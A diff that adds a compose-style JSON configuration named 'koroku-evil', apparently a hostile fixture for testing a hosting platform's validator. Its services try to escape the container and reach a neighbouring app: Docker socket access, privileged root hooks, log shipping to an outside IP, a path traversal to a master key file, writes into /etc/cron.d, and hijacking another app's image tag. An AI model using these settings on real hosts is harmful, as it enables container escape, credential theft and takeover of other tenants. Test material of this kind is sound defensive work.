@@ -1,0 +1,139 @@
+{
+  "name": "koroku-evil",
+  "networks": {
+    "default": {
+      "name": "koroku-evil_default",
+      "ipam": {}
+    }
+  },
+  "services": {
+    "gpu": {
+      "deploy": {
+        "resources": {
+          "reservations": {
+            "devices": [
+              {
+                "capabilities": [
+                  "gpu"
+                ],
+                "count": -1
+              }
+            ]
+          }
+        },
+        "placement": {}
+      },
+      "cgroup_parent": "system.slice",
+      "command": null,
+      "entrypoint": null,
+      "gpus": [
+        {
+          "count": -1
+        }
+      ],
+      "image": "busybox:1.37",
+      "networks": {
+        "default": null
+      }
+    },
+    "runner": {
+      "provider": {
+        "type": "./run-on-host.sh"
+      },
+      "command": null,
+      "entrypoint": null
+    },
+    "socket": {
+      "command": null,
+      "entrypoint": null,
+      "image": "docker:cli",
+      "networks": {
+        "default": null
+      },
+      "use_api_socket": true
+    },
+    "spy": {
+      "command": null,
+      "entrypoint": null,
+      "image": "busybox:1.37",
+      "network_mode": "koroku-blog_default"
+    },
+    "thief": {
+      "command": null,
+      "entrypoint": null,
+      "image": "koroku-blog-web:r41",
+      "networks": {
+        "default": null
+      },
+      "pull_policy": "never"
+    },
+    "web": {
+      "post_start": [
+        {
+          "command": [
+            "sh",
+            "-c",
+            "true"
+          ],
+          "user": "root",
+          "privileged": true
+        }
+      ],
+      "command": null,
+      "entrypoint": null,
+      "logging": {
+        "driver": "syslog",
+        "options": {
+          "syslog-address": "udp://203.0.113.9:514"
+        }
+      },
+      "networks": {
+        "default": null
+      },
+      "security_opt": [
+        "seccomp=./allow-all.json",
+        "no-new-privileges:true"
+      ],
+      "volumes": [
+        {
+          "type": "volume",
+          "source": "hostfs",
+          "target": "/hostfs",
+          "read_only": true,
+          "volume": {}
+        },
+        {
+          "type": "image",
+          "source": "koroku-blog-web:r41",
+          "target": "/other"
+        }
+      ],
+      "build": {
+        "context": "/var/lib/koroku/apps/evil/releases/10",
+        "dockerfile": "../../../../../../etc/koroku/master.key",
+        "entitlements": [
+          "network.host"
+        ],
+        "ssh": [
+          "key=/etc/koroku/github-app.pem"
+        ],
+        "cache_to": [
+          "type=local,dest=/etc/cron.d"
+        ],
+        "tags": [
+          "koroku-blog-web:r41"
+        ]
+      }
+    }
+  },
+  "volumes": {
+    "hostfs": {
+      "name": "koroku-evil_hostfs",
+      "driver_opts": {
+        "device": "overlay",
+        "o": "lowerdir=/etc/koroku:/usr",
+        "type": "overlay"
+      }
+    }
+  }
+}
